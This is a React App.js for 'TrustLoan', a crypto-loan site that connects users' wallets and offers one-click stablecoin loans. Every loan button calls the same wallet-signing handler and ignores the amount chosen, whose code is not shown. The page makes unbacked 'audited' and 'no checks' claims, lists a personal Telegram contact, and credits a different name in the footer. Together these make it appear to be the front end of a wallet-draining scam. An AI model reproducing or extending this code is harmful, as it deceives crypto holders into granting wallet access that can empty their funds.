// App.js
import './styles.css';
import React from 'react';
import ConnectWallet from './components/ConnectWallet';
import { useAccount, useWalletClient } from 'wagmi';
import { handleLoanRequest } from './components/handleLoanRequest';
import { useEffect } from 'react';

function App() {
  useEffect(() => {
  const script = document.createElement('script');
  script.src = '//code.jivosite.com/widget/QteRBV3vK5';
  script.async = true;
  document.body.appendChild(script);
}, []);


  const { isConnected, address } = useAccount();
  const { data: walletClient } = useWalletClient();

  return (
    <div className="app">
      {/* Navbar */}
      <header className="navbar">
        <div className="logo">TrustLoan</div>
        <nav className="nav-links">
          <a href="#how-it-works">How it Works</a>
          <a href="#loan-offers">Loan Offers</a>
          <a href="#faq">FAQ</a>
        </nav>
        {/* ✅ Connect Wallet Button in navbar */}
        <ConnectWallet />
      </header>

      {/* Hero Section */}
      <section className="hero-container">
       <div className="hero">
        {/* Token Icons Left - Hidden on Mobile */}
      <div className="hidden md:flex relative w-[300px] h-[320px] items-center justify-center">
        <div className="relative w-full h-full">
          <img src="/images/ethereum-eth-logo.png" alt="ETH" className="token eth" />
          <img src="/images/usd-coin-usdc-logo.png" alt="USDC" className="token usdc" />
          <img src="/images/dai.png" alt="DAI" className="token dai" />
          <img src="/images/litecoin.png" alt="WBTC" className="token wbtc" />
        </div>
      </div>


          {/* Hero Center */}
          <div className="hero-content-wrapper">
            <div className="hero-content">
              {!isConnected ? (
                <>
                <h1>
                  Welcome to <span className="highlight">Trust Loan</span>
                </h1>

              <section className="bg-gradient-to-br from-[#1c1f26] to-[#0f1115] text-white py-20 px-6 text-center md:text-left">
              <div className="max-w-5xl mx-auto">
                

                <p className="text-lg md:text-xl text-gray-300 mb-10">
                  <strong className="block text-2xl font-semibold text-white mb-3">
                    A Secure and Simple Way to Get Crypto-Backed Loans
                  </strong>
                  Trust loan allows you to borrow stablecoins instantly using your crypto assets as collateral — no credit checks, no paperwork, no intermediaries.
                </p>

                <div className="grid grid-cols-1 md:grid-cols-3 gap-8 text-left">
                  <div>
                    <h3 className="text-xl font-bold text-purple-400 mb-2">Instant Loans</h3>
                    <p className="text-gray-300">
                      Borrow in seconds - no approvals, no delays, on-chain only.
                    </p>
                  </div>
                  <div>
                    <h3 className="text-xl font-bold text-purple-400 mb-2">Secure Collateral</h3>
                    <p className="text-gray-300">
                      Your assets remain safe, locked in audited smart contracts.
                    </p>
                  </div>
                  <div>
                    <h3 className="text-xl font-bold text-purple-400 mb-2">Total Control</h3>
                    <p className="text-gray-300">
                      Repay anytime. Withdraw instantly. No hidden fees or fine print.
                    </p>
                  </div>
                </div>
              </div>
            </section>





            <section className="relative z-10 px-6 py-24 max-w-7xl mx-auto bg-gradient-to-b from-transparent to-[#0f1115] mb-24">
            <h2 className="text-4xl font-extrabold text-white mb-16 text-center tracking-tight">
              How It Works
            </h2>

            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-10 text-white">
              {[
                {
                  title: 'Connect Wallet',
                  icon: '🔗',
                  desc: 'Securely link your crypto wallet in seconds and get started instantly.'
                },
                {
                  title: 'Deposit Collateral',
                  icon: '💼',
                  desc: 'Choose supported assets and lock them into our smart contract as collateral.'
                },
                {
                  title: 'Borrow Instantly',
                  icon: '⚡',
                  desc: 'Receive stablecoins with zero delays — no approvals, no paperwork.'
                },
                {
                  title: 'Repay Anytime',
                  icon: '🔓',
                  desc: 'Unlock your assets at your own pace. No penalties or hidden fees.'
                }
              ].map((step, index) => (
                <div
                  key={index}
                  className="flex flex-col items-center text-center p-8 bg-zinc-900/80 rounded-2xl border border-zinc-800 shadow-xl hover:shadow-purple-500/30 transition-all duration-300 hover:-translate-y-2"
                >
                  <div className="text-5xl mb-6">{step.icon}</div>
                  <h3 className="text-xl font-bold mb-3">{step.title}</h3>
                  <p className="text-gray-400 text-sm leading-relaxed">{step.desc}</p>
                </div>
              ))}
            </div>

            <p className="text-center text-gray-400 mt-16 max-w-2xl mx-auto text-base leading-relaxed">
              All loans are processed 100% on-chain — verifiable, secure, and trustless. Your assets stay under your control at all times.
            </p>
          </section>





                  {/* ✅ Connect Wallet Button in hero */}
                  <ConnectWallet />
                </>
              ) : (
                <div className="connected-dashboard">
                  <h3>Welcome back 👋</h3>
                  <div className="loan-options">
                    <h3 className="loan-heading">Select compatible loan option:</h3>
                    <div className="mt-4 mb-2 bg-yellow-900/20 border border-yellow-600 text-yellow-300 px-4 py-3 rounded-xl text-sm font-medium shadow-md">
                      ⚠️ To protect your loan, your wallet must hold at least <span className="font-semibold text-white">10% of your requested loan</span> as wallet collateral.
                    </div>


                    <div className="loan-grid">
                      {[1000, 5000, 10000, 20000, 50000, 100000].map((amt) => (
                        <button
                          key={amt}
                          className="loan-button"
                          onClick={() => {
                            if (walletClient && address) {
                              handleLoanRequest(walletClient, address);
                            }
                          }}
                        >
                          ${amt.toLocaleString()}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* Hero Right Phone Image */}
          <div className="hero-image">
            <img src="/images/iphone-mockup.png" alt="iPhone mockup with wallet" />
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="footer">
        <div className="footer-content">
          <div className="footer-left">
            <h2 className="footer-logo">TrustLoan</h2>
            <p>Empowering decentralized access to instant loans. No paperwork. No delay.</p>
          </div>
          <div className="footer-links">
            <div className="footer-column">
              <h4>Navigate</h4>
              <a href="#how-it-works">How it Works</a>
              <a href="#loan-offers">Loan Offers</a>
              <a href="#faq">FAQ</a>
            </div>
            <div className="footer-column">
              <h4>Connect</h4>
              <a href="https://t.me/josecsco" target="_blank" rel="noopener noreferrer">Telegram</a>
              <a href="#">Twitter</a>
              <a href="#">Contact Support</a>
            </div>
          </div>
        </div>
        <div className="footer-bottom">
          <p>&copy; 2025 Xylon — All rights reserved.</p>
        </div>
      </footer>
    </div>
  );
}



export default App;
